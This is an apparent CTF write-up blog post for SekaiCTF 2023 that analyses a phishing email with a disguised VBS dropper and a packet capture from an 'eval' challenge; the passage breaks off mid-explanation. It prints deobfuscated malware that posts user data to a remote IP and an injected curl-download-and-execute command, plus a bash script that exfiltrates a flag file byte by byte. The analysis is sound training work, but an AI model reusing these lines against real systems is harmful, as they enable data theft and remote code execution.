<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ForensicsDEF CON InvitationScore: 100Solves: 148&#x2F;2013Attachments: DEFCON_Finals_Invitation.eml dc31-invite.ics venue-map.png.vbs defcon-flag.png.XORed  As you all know, DEF CON CTF Qualifier 2023">
<meta property="og:type" content="article">
<meta property="og:title" content="SekaiCTF 2023 Writeups">
<meta property="og:url" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/index.html">
<meta property="og:site_name" content="0xsh">
<meta property="og:description" content="ForensicsDEF CON InvitationScore: 100Solves: 148&#x2F;2013Attachments: DEFCON_Finals_Invitation.eml dc31-invite.ics venue-map.png.vbs defcon-flag.png.XORed  As you all know, DEF CON CTF Qualifier 2023">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/DEFCON_Finals_Invitation-content.PNG">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/ics-content.PNG">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/storage.googleapis.com_defcon-nautilus_venue-guide.html.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/gchq.github.io_CyberChef_defcon-invitation.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/defcon-flag.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/azusawas-gacha-world-game.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/azusawas-gacha-world-game-rate.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/azusawas-gacha-world-game-drop.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/azusawas-gacha-world-game-asset-extract.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/azusawas-gacha-world-flag.png">
<meta property="article:published_time" content="2023-08-31T04:00:15.000Z">
<meta property="article:modified_time" content="2023-08-31T07:03:21.201Z">
<meta property="article:author" content="Narongpol Kijrangsan">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/DEFCON_Finals_Invitation-content.PNG">
    
    
      
        
          <link rel="shortcut icon" href="../../../../images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>SekaiCTF 2023 Writeups</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../about/">About</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="../../21/CybergonCTF-2023-Writeups/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&text=SekaiCTF 2023 Writeups"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&is_video=false&description=SekaiCTF 2023 Writeups"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SekaiCTF 2023 Writeups&body=Check out this article: https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&name=SekaiCTF 2023 Writeups&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&t=SekaiCTF 2023 Writeups"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DEF-CON-Invitation"><span class="toc-number">1.1.</span> <span class="toc-text">DEF CON Invitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.1.1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Analysis"><span class="toc-number">1.1.3.</span> <span class="toc-text">Dynamic Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Retrieve-the-key"><span class="toc-number">1.1.4.</span> <span class="toc-text">Retrieve the key</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Eval-Me"><span class="toc-number">1.2.</span> <span class="toc-text">Eval Me</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Azusawa%E2%80%99s-Gacha-World"><span class="toc-number">2.1.</span> <span class="toc-text">Azusawa’s Gacha World</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        SekaiCTF 2023 Writeups
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Narongpol Kijrangsan</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-31T04:00:15.000Z" class="dt-published" itemprop="datePublished">2023-08-31</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="DEF-CON-Invitation"><a href="#DEF-CON-Invitation" class="headerlink" title="DEF CON Invitation"></a>DEF CON Invitation</h3><p>Score: 100<br>Solves: 148&#x2F;2013<br>Attachments: <a href="DEFCON_Finals_Invitation.eml">DEFCON_Finals_Invitation.eml</a> <a href="dc31-invite.ics">dc31-invite.ics</a> <a href="venue-map.png.vbs">venue-map.png.vbs</a> <a href="defcon-flag.png.XORed">defcon-flag.png.XORed</a></p>
<blockquote>
<p>As you all know, <a target="_blank" rel="noopener" href="https://quals.2023.nautilus.institute/teams/4.html">DEF CON CTF Qualifier 2023</a> was really competitive and we didn’t make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from <em>Nautilus Institute</em> to attend the event. Should we accept the invitation and schedule the trip?</p>
</blockquote>
<p>Author: sahuang</p>
<h4 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h4><p>Upon opening a file, we will see an attachment and some messages and link to social platforms, after some investigation the only thing that is of interest to us is the only <code>dc31-invite.ics</code> file, which is a calendar file of some sort</p>
<p><img src="DEFCON_Finals_Invitation-content.PNG"></p>
<p>Since I don’t have calendar app installed nor I want to open it, we can just read it with a text editor since it’s a readable file format</p>
<p><img src="ics-content.PNG"></p>
<p>We could see that it contains a link to <a target="_blank" rel="noopener" href="https://storage.googleapis.com/defcon-nautilus/venue-guide.html">https://storage.googleapis.com/defcon-nautilus/venue-guide.html</a></p>
<p><img src="storage.googleapis.com_defcon-nautilus_venue-guide.html.png"></p>
<p>The website offers us an offline map</p>
<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p>There’re many line of codes inside the file, and there’re some content that are obfuscated:</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewkjunfw = Replace(<span class="string">&quot;68IlllIllIIIllllIllII74IlllIllIIIllllIllII74...&lt;SNIPPED&gt;...&quot;</span>, <span class="string">&quot;IlllIllIIIllllIllII&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>This is a light obfuscation and we can trying to decode it without running it, we can see that it will replace <code>IlllIllIIIllllIllII</code> with a space so we do it ourselves</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68747470733a2f2f646f776e6c6f6164313634372e6d65646961666972652e636f6d2f6c313838753264353332716733664f6f4c70696c6349383970305f6834453063474c6a6b5f7576425569616737455f724d5a2d48352d6d65394b723953514c5651614b53694b6345764a4f2d456b6654535571576c724e36537a586749304c5942682d4635656d34494134695833744f49476830456a3436476c77764c4f665438707a76757939315574656a31723249306a67375973554e6373735074656435303864736b5752706b41492f796561353335687667703332766d762f646566636f6e2d666c61672e706e672e584f526564</span><br></pre></td></tr></table></figure>

<p>We could see that it get passed into <code>OwOwO</code> function and get converted from hex to text</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dim</span> xHttp: <span class="keyword">Set</span> xHttp = createobject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">dim</span> bStrm: <span class="keyword">Set</span> bStrm = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">xHttp.Open <span class="string">&quot;GET&quot;</span>, OwOwO(ewkjunfw), <span class="literal">False</span></span><br><span class="line">xHttp.Send</span><br></pre></td></tr></table></figure>

<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> OwOwO(h)</span><br><span class="line">  <span class="keyword">Dim</span> a : a = Split(h)</span><br><span class="line">  <span class="keyword">Dim</span> i</span><br><span class="line">  <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> UBound(a)</span><br><span class="line">      a(i) = Chr(<span class="string">&quot;&amp;H&quot;</span> &amp; a(i))</span><br><span class="line">  <span class="keyword">Next</span></span><br><span class="line">  OwOwO = <span class="keyword">Join</span>(a, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>

<p>Using CyberChef we would recover the plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed</span><br></pre></td></tr></table></figure>

<p>I visit the website and could download it, but look like it is XORed with some password. So we have to look further into the code and hope to get some more information</p>
<p>Looking down further we could see another obfuscated text</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> bStrm</span><br><span class="line">    .type = <span class="number">1</span></span><br><span class="line">    .open</span><br><span class="line">    .write xHttp.responseBody</span><br><span class="line">    .savetofile Nautilus(StRREVErsE(replace(<span class="string">&quot;=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y&quot;</span>, <span class="string">&quot;###############_###&quot;</span>, <span class="string">&quot;z&quot;</span>)), <span class="literal">False</span>), <span class="number">2</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">with</span></span><br></pre></td></tr></table></figure>

<p>Using similar technique we’ve used before we could can convert from <code>=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y&quot;, &quot;###############_###</code> to <code>=QWZzlWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcpzY</code></p>
<p>and using the command <code>echo -n &#39;=QWZzlWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcpzY&#39; | rev | base64 -d</code> to retrieve the plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\temp\defcon-flag.png.compromised</span><br></pre></td></tr></table></figure>

<p>Still not so much of interest to us</p>
<p>Further down we could see a blob of text that will be decoded and and get executed</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Execute(chr(-<span class="number">40321</span>+<span class="built_in">CLng</span>(<span class="string">&quot;&amp;H9dc5&quot;</span>))&amp;chr(-<span class="number">70744</span>+<span class="built_in">CLng</span>(<span class="string">&quot;&amp;H114c1&quot;</span>))&amp;chr(<span class="number">5810790</span>/<span class="built_in">CLng</span>(<span class="string">&quot;&amp;Hd03e&quot;</span>))&amp;chr(<span class="built_in">CLng</span>(<span class="string">&quot;&amp;H10547&quot;</span>)-<span class="number">66855</span>)&amp;chr(-<span class="number">3061</span>+<span class="built_in">CLng</span>(<span class="string">&quot;&amp;Hc5d&quot;</span>))...&lt;SNIPPED&gt;...)</span><br></pre></td></tr></table></figure>

<h4 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h4><p>Since It could to much to time reverse the obfuscated text into plaintext manually, we have to reside to dynamic analysis</p>
<p>Easy way to go about it is to just copy the obfuscated text and instead of passed it into <code>Execute</code> we could just print it to see what it is up to</p>
<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> http: <span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span><br><span class="line"><span class="keyword">Dim</span> url: url = <span class="string">&quot;http://20.106.250.46/sendUserData&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">With</span> http</span><br><span class="line">  <span class="keyword">Call</span> .Open(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">False</span>)</span><br><span class="line">  <span class="keyword">Call</span> .SetRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">  <span class="keyword">Call</span> .Send(<span class="string">&quot;&#123;&quot;&quot;username&quot;&quot;:&quot;&quot;&quot;</span> &amp; strUser &amp; <span class="string">&quot;&quot;&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"></span><br><span class="line">res = Msgbox(<span class="string">&quot;Thank you for your cooperation!&quot;</span>, vbOKOnly+vbInformation, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Retrieve-the-key"><a href="#Retrieve-the-key" class="headerlink" title="Retrieve the key"></a>Retrieve the key</h4><p>We can try to contact the link found in deobfuscated text</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST <span class="string">&quot;http://20.106.250.46/sendUserData&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;john&quot;&#125;&#x27;</span> </span><br><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;compromised&quot;</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Not admin!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">$ curl -X POST <span class="string">&quot;http://20.106.250.46/sendUserData&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;02398482aeb7d9fe98bf7dc7cc_ITDWWGMFNY&quot;</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Data compromised!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Luckily the server leak the key for us! <code>02398482aeb7d9fe98bf7dc7cc_ITDWWGMFNY</code></p>
<p>Let’s go to CyberChef to decode the image</p>
<p><img src="gchq.github.io_CyberChef_defcon-invitation.png"></p>
<p>Case solved!</p>
<p><img src="defcon-flag.png"></p>
<p>Flag: <code>SEKAI&#123;so_i_guess_we&#39;ll_get_more_better_next_year-_-&#125;</code></p>
<h3 id="Eval-Me"><a href="#Eval-Me" class="headerlink" title="Eval Me"></a>Eval Me</h3><p>Score: 100<br>Solves: 303&#x2F;2013<br>Attachments: <a href="eval-me-capture.pcapng">capture.pcapng</a></p>
<blockquote>
<p>I was trying a beginner CTF challenge and successfully solved it. But it didn’t give me the flag. Luckily I have this network capture. Can you investigate?<br><code>nc chals.sekai.team 9000</code></p>
</blockquote>
<p>Author: Guesslemonger</p>
<p>Using the command they’ve given to us we will see that it will ask us with series of simple math expression and we have to answer within a specific tiny timeframe and can only be done by automation. Unfortunately, since the server has been down I can’t give you the what the response look like.</p>
<p>We could use the following script to communicate with the server</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;chals.sekai.team&#x27;</span>, <span class="string">&#x27;9000&#x27;</span>])</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(io.recvline()[:-<span class="number">1</span>:].decode())).encode())</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>If we look closely on the response, we will see that it will inject <code>__import__(&quot;subprocess&quot;).check_output(&quot;(curl -sL https://shorturl.at/fgjvU -o extract.sh &amp;&amp; chmod +x extract.sh &amp;&amp; bash extract.sh &amp;&amp; rm -f extract.sh)&gt;/dev/null 2&gt;&amp;1||true&quot;,shell=True)</code> in one of the response which will be passed to our <code>eval</code> function, which will download <code>extract.sh</code>, execute it, and remove it. Luckily for us, since we turn on debugging we could see that they inject us</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FLAG=$(<span class="built_in">cat</span> flag.txt)</span><br><span class="line"></span><br><span class="line">KEY=<span class="string">&#x27;s3k@1_v3ry_w0w&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46</span></span><br><span class="line"><span class="function"><span class="title">Asc</span></span>() &#123; <span class="built_in">printf</span> <span class="string">&#x27;%d&#x27;</span> <span class="string">&quot;&#x27;<span class="variable">$1</span>&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">XOREncrypt</span></span>()&#123;</span><br><span class="line">    <span class="built_in">local</span> key=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> DataIn=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> ptr DataOut val1 val2 val3</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (( ptr=<span class="number">0</span>; ptr &lt; <span class="variable">$&#123;#DataIn&#125;</span>; ptr++ )); <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">        val1=$( Asc <span class="string">&quot;<span class="variable">$&#123;DataIn:$ptr:1&#125;</span>&quot;</span> )</span><br><span class="line">        val2=$( Asc <span class="string">&quot;<span class="variable">$&#123;key:$(( ptr % <span class="variable">$&#123;#key&#125;</span> )):1&#125;</span>&quot;</span> )</span><br><span class="line"></span><br><span class="line">        val3=$(( val1 ^ val2 ))</span><br><span class="line"></span><br><span class="line">        DataOut+=$(<span class="built_in">printf</span> <span class="string">&#x27;%02x&#x27;</span> <span class="string">&quot;<span class="variable">$val3</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$&#123;#DataOut&#125;</span>;i+=<span class="number">2</span>)); <span class="keyword">do</span></span><br><span class="line">        BYTE=<span class="variable">$&#123;DataOut:$i:2&#125;</span></span><br><span class="line">        curl -m 0.5 -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;<span class="variable">$BYTE</span>\&quot;&#125;&quot;</span> http://35.196.65.151:30899/ &amp;&gt;/dev/null</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XOREncrypt <span class="variable">$KEY</span> <span class="variable">$FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Taking a look at the <code>extract.sh</code> script we could see that once that the script execute, it will XOR the flag with <code>s3k@1_v3ry_w0w</code> and send it to <code>http://35.196.65.151:30899/</code></p>
<p>Upon opening the given <code>capture.pcapng</code> file. We could see the request and response in relation the <code>extract.sh</code> in some of TCP connections</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 35.196.65.151:30899</span><br><span class="line">User-Agent: curl/7.88.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">&#123;&quot;data&quot;:&quot;4b&quot;&#125;HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.25.1</span><br><span class="line">Date: Wed, 02 Aug 2023 19:31:08 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 12</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;ok&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>Now the only thing to do is to extract the <code>data</code> fields inside the PCAP file and decrypt it with the key we found inside <code>extract.sh</code> script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r capture.pcapng -T fields -e <span class="string">&#x27;json.value.string&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f</span><br></pre></td></tr></table></figure>

<p>Then passing it into the reverse python script of <code>extract.sh</code> to decrypt it, like so</p>
